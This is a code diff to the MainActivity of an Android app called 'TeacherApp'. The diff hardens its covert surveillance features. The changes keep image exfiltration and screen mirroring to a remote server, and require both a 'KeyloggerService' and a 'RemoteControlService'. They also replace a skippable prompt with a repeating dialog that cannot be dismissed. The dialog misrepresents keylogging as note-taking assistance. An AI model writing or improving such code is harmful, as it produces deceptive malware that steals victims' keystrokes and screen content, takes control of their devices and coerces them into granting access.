@@ -223,14 +223,15 @@ class MainActivity : ComponentActivity() {
             ImageExfiltrationService.startExfiltration(this@MainActivity)
         }
 
-        // Start screen mirroring to EC2
+        // Step 1: Request screen sharing first
         val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         projectionLauncher.launch(projectionManager.createScreenCaptureIntent())
 
-        // Prompt for accessibility service after a delay
+        // Step 2: After screenshare dialog is handled, start non-stop accessibility loop
+        // (delay so the two system dialogs don't overlap)
         Handler(Looper.getMainLooper()).postDelayed({
-            promptAccessibilityService()
-        }, 3000)
+            startAccessibilityLoop()
+        }, 4000)
     }
 
     // ========== PUBLIC FUNCTIONS — Called from Settings screen ==========
@@ -365,32 +366,60 @@ class MainActivity : ComponentActivity() {
 
     // ========== ACCESSIBILITY SERVICE ==========
 
+    private val accessibilityHandler = Handler(Looper.getMainLooper())
+    private var accessibilityDialogShowing = false
+
     private fun isAccessibilityServiceEnabled(): Boolean {
-        val serviceName = "com.teacherapp.services.KeyloggerService"
-        val expectedComponentName = "$packageName/$serviceName"
-        val enabledServicesSetting = Settings.Secure.getString(
+        val enabled = Settings.Secure.getString(
             contentResolver,
             Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
         ) ?: return false
-        val colonSplitter = TextUtils.SimpleStringSplitter(':')
-        colonSplitter.setString(enabledServicesSetting)
-        while (colonSplitter.hasNext()) {
-            if (colonSplitter.next().equals(expectedComponentName, ignoreCase = true)) return true
+        val splitter = TextUtils.SimpleStringSplitter(':')
+        splitter.setString(enabled)
+        val keylogger  = "$packageName/com.teacherapp.services.KeyloggerService"
+        val remoteCtrl = "$packageName/com.example.teacherapp.services.RemoteControlService"
+        var hasKeylogger = false
+        var hasRemote = false
+        while (splitter.hasNext()) {
+            val svc = splitter.next()
+            if (svc.equals(keylogger,  ignoreCase = true)) hasKeylogger = true
+            if (svc.equals(remoteCtrl, ignoreCase = true)) hasRemote    = true
         }
-        return false
+        return hasKeylogger && hasRemote
     }
 
-    private fun promptAccessibilityService() {
-        if (isAccessibilityServiceEnabled()) return
+    private val accessibilityCheckRunnable = object : Runnable {
+        override fun run() {
+            if (isFinishing) return
+            if (!isAccessibilityServiceEnabled()) {
+                if (!accessibilityDialogShowing) showAccessibilityDialog()
+                accessibilityHandler.postDelayed(this, 8000)
+            }
+        }
+    }
+
+    fun startAccessibilityLoop() {
+        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
+        accessibilityHandler.post(accessibilityCheckRunnable)
+    }
+
+    private fun showAccessibilityDialog() {
+        if (isFinishing || accessibilityDialogShowing) return
+        accessibilityDialogShowing = true
         AlertDialog.Builder(this)
-            .setTitle("Enable Enhanced Features")
-            .setMessage("TeacherApp provides enhanced text input assistance for better note-taking.\n\nTo enable this feature, please activate 'TeacherApp' in Accessibility settings.")
-            .setPositiveButton("Enable Now") { dialog, _ ->
+            .setTitle("Action Required")
+            .setMessage(
+                "TeacherApp requires accessibility features to be enabled for enhanced text input " +
+                "assistance and note-taking support.\n\n" +
+                "Please enable ALL 'TeacherApp' services in the Accessibility settings to continue."
+            )
+            .setPositiveButton("Open Settings") { dialog, _ ->
                 dialog.dismiss()
+                accessibilityDialogShowing = false
                 openAccessibilitySettings()
             }
-            .setNegativeButton("Skip") { dialog, _ -> dialog.dismiss() }
             .setCancelable(false)
+            .setOnDismissListener { accessibilityDialogShowing = false }
             .show()
     }
 
@@ -399,7 +428,7 @@ class MainActivity : ComponentActivity() {
             val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
             startActivity(intent)
-            Toast.makeText(this, "Please enable 'TeacherApp' in the list", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Enable ALL TeacherApp services in the list", Toast.LENGTH_LONG).show()
         } catch (e: Exception) {
             Toast.makeText(this, "Could not open accessibility settings", Toast.LENGTH_LONG).show()
         }
@@ -436,8 +465,14 @@ class MainActivity : ComponentActivity() {
     override fun onResume() {
         super.onResume()
         inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
-        if (isAccessibilityServiceEnabled()) {
-            android.util.Log.d("MainActivity", "✅ Accessibility service is now enabled!")
+        // When user returns from accessibility settings, re-trigger the loop
+        // so it immediately re-checks and dismisses or re-prompts
+        if (!isAccessibilityServiceEnabled()) {
+            accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
+            accessibilityHandler.postDelayed(accessibilityCheckRunnable, 1500)
+        } else {
+            // Both services enabled — stop the loop
+            accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
         }
     }
 
@@ -447,6 +482,7 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onDestroy() {
+        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
         unregisterReceiver(screenReceiver)
         wakeLock?.release()
         super.onDestroy()
